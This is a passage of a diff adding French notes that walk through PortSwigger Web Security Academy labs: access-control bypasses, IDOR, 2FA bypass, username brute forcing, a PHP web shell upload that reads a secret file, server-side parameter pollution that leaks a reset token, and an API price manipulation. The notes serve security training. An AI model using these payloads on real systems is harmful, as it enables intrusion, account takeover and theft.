+> adminPanelTag.setAttribute('href', '/admin-vnq2da');
+
+	GET /admin-vnq2da
+	GET /admin-vnq2da/delete?username=carlos
+    
+### User role controlled by request parameter
+
+	GET /admin
+
+Aller sur la page de login, puis commencer à intercepter les requêtes ET les réponses (“Proxy settings” => “Intercept reponses based on the following rules:”). 
+
+Se connecter sur cette page avec les credentials d’utilisateur simple donnés dans la consigne.
+
+Changer “Cookie: session=VrbUBr7c6DzenjfmQuOIDax5UndrINrK; Admin=false” en 
+“Cookie: session=VrbUBr7c6DzenjfmQuOIDax5UndrINrK; Admin=true” dans la réponse puis dans chaque requête que l’on va effectuer avec cet utilisateur simple.
+
+### User ID controlled by request parameter, with unpredictable user IDs
+
+Aller sur n’importe quel article posté par Carlos et observer le paramètre “userId=d22a802d-ac88-48ff-b237-c137214a0f89” dans l’URL.
+
+Se connecter avec le compte utilisateur fourni dans la consigne puis reprendre ce paramètre et le mettre dans l’URL suivante à la place du nôtre : 
+https://0a98001b04df8474826c92e2004700dc.web-security-academy.net/my-account?id=fc22df53-bdc5-484b-9c5b-8f1b952d4f5a 
+
+### User ID controlled by request parameter with password disclosure
+
+Se connecter sur la page de login avec le compte utilisateur fourni dans la consigne.
+
+Aller dans l’onglet “My account” et changer le paramètre de l’URL en “Administrator” : 
+
+    GET /my-account?id=administrator
+
+Observer le code HTML de la réponse obtenue, le mot de passe se trouve dans un formulaire caché : 
+
+    <input required type=password name=password value='wz5ub7i9y4vqvcspqek2'/>
+
+## === Authentication === 
+
+### Username enumeration via different responses
+
+Lancer un Intruder pour déduire le vrai nom (Length 3250 vs Length 3248).
+Lancer un deuxième Intruder avec le nom pour bruteforcer le login.
+
+### 2FA simple bypass
+
+Se connecter sur la page de login avec le compte fourni dans la consigne.
+Aller sur l’onglet “Email client” pour réceptionner le 2FA.
+Entrer le 2FA pour terminer l’authentification avec le premier compte.
+Remarquer que l’URL se termine par “/my-account?id=wiener”.
+
+Se connecter avec les credentials de la victime.
+
+Quand le 2FA est demandé pour la victime, remplacer la fin de l’URL par “/my-account?id=carlos” et relancer la page.
+
+## === WebSockets === 
+
+### X
+
+## === Web cache poisoning ===
+
+### X
+
+## === Insecure deserialization === 
+
+### X
+
+## === Information disclosure ===
+
+### X
+
+## === Business logic vulnerabilities ===
+
+### X 
+
+## === HTTP Host header attacks ===
+
+### X 
+
+## === OAuth authentication ===
+
+### X 
+
+## === File upload vulnerabilities ===
+
+### Remote code execution via web shell upload
+
+Se connecter sur la page /my-account et changer d’avatar. D’abord choisir une image classique. 
+
+Une fois l’image uploadée, rafraîchir pour regarder son compte et observer la requête avec Burp. Remarquer le morceau suivant : 
+
+    <img src="/files/avatars/Nietzsche.jpg" class=avatar>
+
+Changer d’avatar une deuxième fois et mettre un webshell PHP classique à la place : 
+
+    <?php echo system($_GET['command']); ?>
+
+Exécuter le webshell en allant sur l’URL trouvée à partir de l’image : 
+
+> https://0a31007e03aad04685695dc0002c00cf.web-security-academy.net/files/avatars/Webshell.php?command=ls
+
+> https://0a31007e03aad04685695dc0002c00cf.web-security-academy.net/files/avatars/Webshell.php?command=cat%20/home/carlos/secret 
+
+### Web shell upload via Content-Type restriction bypass
+
+Tenter de déposer le même webshell que pour le lab précédent.
+
+On voit cette erreur : 
+
+“Sorry, file type application/octet-stream is not allowed 
+Only image/jpeg and image/png are allowed 
+Sorry, there was an error uploading your file.”
+
+Sur Burp, prendre la requête POST et la transférer au Repeater.
+
+Remplacer “Content-Type: application/octet-stream” par “Content-Type: image/jpeg” et la renvoyer
+
+Aller sur l’URL permettant d’interagir avec le webshell : 
+
+> https://0a4700d2034ad0458506767700390095.web-security-academy.net/files/avatars/Webshell.php?command=cat%20/home/carlos/secret 
+
+## === JWT ===
+
+### X
+
+## === Essential skills ===
+
+### X
+
+## === Prototype pollution ===
+
+### X 
+
+## === GraphQL API vulnerabilities ===
+
+### X 
+
+## === Race conditions ===
+
+### X
+
+## === NoSQL injection ===
+
+### X
+
+## === API testing ===
+
+### Exploiting an API endpoint using documentation
+
+En utilisant la fonctionnalité de changement d'adresse, on voit qu'elle fait une requête vers un endpoint : 
+
+>PATCH /api/user/wiener HTTP/2
+
+Requêtes à faire pour explorer la documentation de l'API puis supprimer Carlos : 
+
+>GET /api/ HTTP/2
+>DELETE /api/user/carlos HTTP/2
+
+### Exploiting server-side parameter pollution in a query string
+
+La requête de réinitialisation du mot de passe effectue une requête POST avec un paramètre "**username**" et est associée à une requête GET sur un fichier Javascript : 
+
+>POST /forgot-password HTTP/2
+>...
+>csrf=lxuaYEvzuwJoqruzETFb3N3DYXE6Fk5c&username=administrator
+>...
+>GET /static/js/forgotPassword.js
+
+En essayant de polluer ce paramètre, on obtient quelques résultats intéressants : 
+
+**&username=administrator&aaa=bbb** => Réponse classique
+**&username=administrator%26aaa=bbb** => "Parameter is not supported."
+**&username=administrator%23** => "Field not specified."
+**&username=administrator%26field=abc** => "Invalid field."
+
+En fuzzant ce paramètre sur Intruder (Add from list -> Server-side variable names), on trouve une seule réponse valide pour "**email**"
+
+Le payload **&username=administrator%26field=email** renvoie la même réponse classique qui nous résume les valeurs entrées.
+
+En fouillant le fichier **forgotPassword.js** on remarque une variable **${resetToken}** : 
+
+    [...]
+    const resetToken = urlParams.get('reset-token');
+    if (resetToken)
+    {
+        window.location.href = `/forgot-password?reset_token=${resetToken}`;
+    }
+    [...]
+
+En remplaçant "email" par "reset-token" on obtient ce qui ressemble à un token : 
+
+**&username=administrator%26field=reset-token**
+
+>{"type":"reset_token","result":"uw04lq6pgerbhol1plbqzll893oo9s3m"}
+
+Il n'y a plus qu'à utiliser ce token dans la requête de changement de mot de passe : 
+
+https://0a85004a04a9c13786ea18cf00760090.web-security-academy.net/forgot-password?reset_token=uw04lq6pgerbhol1plbqzll893oo9s3m
+
+Attention à bien encoder les caractères de type '&', '#', etc.
+
+### Finding and exploiting an unused API endpoint
+
+En essayant de modifier le verbe de la requête vers **/api/products/1/price** on obtient le résultat suivant : 
+
+>HTTP/2 405 Method Not Allowed
+>Allow: GET, PATCH
+
+En essayant de mettre un PATCH on a l'erreur suivante : 
+
+    {"type":"ClientError","code":400,"error":"Only 'application/json' Content-Type is supported"}
+
+En ajoutant le bon Content-Type et en mettant du JSON on a l'erreur suivante : 
+
+    {"type":"ClientError","code":400,"error":"'price' parameter missing in body"}
+    
+En mettant le contenu suivant, cela fonctionne : 
+
+    {"price":0}
+
+Le prix de la veste passe à 0 et on peut l'acheter gratuitement.
+
+### Exploiting a mass assignment vulnerability
+
+X
+
+### Exploiting server-side parameter pollution in a REST URL
+
+## === Web LLM attacks === 
+
+### X
